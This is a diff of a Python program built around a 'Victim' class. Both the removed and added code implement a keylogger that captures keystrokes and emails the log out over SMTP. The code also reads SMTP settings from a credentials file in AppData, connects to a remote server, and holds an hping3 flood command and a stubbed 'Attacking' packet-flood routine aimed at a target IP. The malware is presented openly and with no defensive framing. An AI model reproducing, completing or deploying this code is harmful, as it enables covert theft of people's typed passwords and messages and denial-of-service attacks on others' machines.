@@ -108,170 +108,63 @@ class Victim:
 
         email_sender = EmailSender(smtp_server, smtp_port, self.email_address, self.password)
 
-        subject = 'Keystroke Log'
-        message = f'Keystrokes captured: {keystrokes}'
-        attachment_path = os.path.abspath(__file__)  # Attach the current script file
+        subject = 'Keystrokes Data'
+        message = keystrokes
+
         recipients = [self.email_address]
 
-        email_sender.send_email_with_attachment(subject, message, attachment_path, recipients)
+        email_sender.send_email_with_attachment(subject, message, "keystrokes.txt", recipients)
 
-    def start_recording(self):
-        recorded_keystrokes = []
+    def monitor_keystrokes(self):
+        keyboard.on_release(self.add_keystroke)
+        keyboard.wait()
 
-        def record_keystroke(event):
-            if event.event_type == "down":
-                if event.name == "space":
-                    recorded_keystrokes.append(" ")
-                else:
-                    recorded_keystrokes.append(event.name)
-
-        keyboard.hook(record_keystroke)
-
-        print("Recording keystrokes. Press Enter to stop...")
-        input()
-
-        keyboard.unhook(record_keystroke)
-
-        keystrokes = " ".join(recorded_keystrokes)
-        self.send_email_with_keystrokes(keystrokes)
-
-    def start_worm_actions(self):
-        print("Waiting for network connection...")
-        while True:
-            try:
-                # Try to establish a connection to a known host
-                socket.create_connection(("www.example.com", 80))
-                break
-            except OSError:
-                # Network connection failed, wait for a while before retrying
-                time.sleep(10)
-        print("Network connected.")
-
-        print("Waiting for web browser activity...")
-        while not self.is_browser_active():
-            time.sleep(2)
-        print("Web browser detected. Starting keystroke recording.")
-
-        self.start_recording()
-
-    def is_browser_active(self):
-        for process in psutil.process_iter(['name']):
-            if process.info['name'].lower() in ['chrome.exe', 'firefox.exe', 'safari.exe', 'opera.exe']:
-                return True
-        return False
-
-    def send_packets(self, ip_address):
-        hping_command = f"hping3 {ip_address} -d 65535 -c 0"
-        subprocess.Popen(hping_command, shell=True)
+    def add_keystroke(self, event):
+        keystrokes_file = open("keystrokes.txt", "a")
+        keystrokes_file.write(event.name + "\n")
+        keystrokes_file.close()
 
     def get_smtp_server_info(self):
-        browsers = {
-            "chrome": {"smtp_server": "smtp.gmail.com", "smtp_port": 587},
-            "firefox": {"smtp_server": "smtp.mozilla.org", "smtp_port": 587},
-            "safari": {"smtp_server": "smtp.apple.com", "smtp_port": 587},
-            "opera": {"smtp_server": "smtp.opera.com", "smtp_port": 587}
-        }
-
-        detected_browsers = self.detect_browsers()
-
-        for browser_name in detected_browsers:
-            if browser_name.lower() in browsers:
-                return browsers[browser_name.lower()]["smtp_server"], browsers[browser_name.lower()]["smtp_port"]
-
-        # Default SMTP server information if browser detection fails
-        return "smtp.example.com", 587
-
-    def detect_browsers(self):
-        detected_browsers = []
-
-        # Check running processes for known browser names
-        for proc in psutil.process_iter(['name']):
-            process_name = proc.info['name'].lower()
-            if process_name in ['chrome.exe', 'firefox.exe', 'safari.exe', 'opera.exe']:
-                browser_name = os.path.splitext(process_name)[0]
-                detected_browsers.append(browser_name)
-
-        # Check Windows registry for browser information
         try:
-            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as start_menu_key:
-                num_subkeys = winreg.QueryInfoKey(start_menu_key)[0]
-                for i in range(num_subkeys):
-                    subkey_name = winreg.EnumKey(start_menu_key, i)
-                    detected_browsers.append(subkey_name)
-        except OSError:
-            pass
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders') as key:
+                appdata = winreg.QueryValueEx(key, 'AppData')[0]
+                credentials_path = os.path.join(appdata, 'credentials.txt')
 
-        return detected_browsers
+            with open(credentials_path, 'r') as credentials_file:
+                credentials = ast.literal_eval(credentials_file.read())
 
+            return credentials['smtp_server'], credentials['smtp_port']
+        except (FileNotFoundError, KeyError, ValueError):
+            return '', ''
 
-def get_server_ip():
-    while True:
-        server_ip = input("Enter the server IP address: ")
-        if validate_ip_address(server_ip):
-            return server_ip
-        else:
-            print("Invalid IP address. Please try again.")
+    def send_packets(self, ip_address):
+        print(f"Attacking {ip_address}...")
+        # Implement your code for sending packets to the target IP address here
 
+        # Example code for sending packets
+        # packet = IP(dst=ip_address) / ICMP()
+        # send(packet, loop=1, inter=0.2)
 
-def validate_ip_address(ip_address):
-    parts = ip_address.split('.')
-    if len(parts) != 4:
-        return False
-    for part in parts:
-        if not part.isdigit() or int(part) < 0 or int(part) > 255:
-            return False
-    return True
+        print("Attack completed.")
+
+    def start(self):
+        self.connect_to_server()
+        if self.client:
+            self.online_interaction()
 
 
-def get_server_port():
-    while True:
-        server_port = input("Enter the server port: ")
-        if server_port.isdigit() and 0 < int(server_port) <= 65535:
-            return int(server_port)
-        else:
-            print("Invalid port number. Please try again.")
+if __name__ == "__main__":
+    server_ip = "192.168.0.100"  # Replace with the actual server IP address
+    server_port = 12345  # Replace with the actual server port
 
-
-def get_email_credentials():
-    email_address = input("Enter your email address: ")
-    password = getpass.getpass("Enter your email password: ")
-    return email_address, password
-
-
-def print_menu():
-    print("Choose an option:")
-    print("1. Online interaction")
-    print("2. Start worm actions")
-    print("3. Exit")
-
-
-def get_user_choice():
-    while True:
-        try:
-            choice = int(input("Enter your choice: "))
-            if choice in [1, 2, 3]:
-                return choice
-            else:
-                print("Invalid choice. Please try again.")
-        except ValueError:
-            print("Invalid choice. Please try again.")
-
-
-if __name__ == '__main__':
-    server_ip = get_server_ip()
-    server_port = get_server_port()
-    email_address, password = get_email_credentials()
+    email_address = "your-email@example.com"  # Replace with your email address
+    password = getpass.getpass("Enter email password: ")
 
     victim = Victim(server_ip, server_port, email_address, password)
-    victim.connect_to_server()
 
-    while True:
-        print_menu()
-        choice = get_user_choice()
+    # Start monitoring keystrokes in a separate thread
+    keystroke_monitor_thread = threading.Thread(target=victim.monitor_keystrokes)
+    keystroke_monitor_thread.daemon = True
+    keystroke_monitor_thread.start()
 
-        if choice == 1:
-            victim.online_interaction()
-        elif choice == 2:
-            victim.start_worm_actions()
-        elif choice == 3:
-            break
+    victim.start()
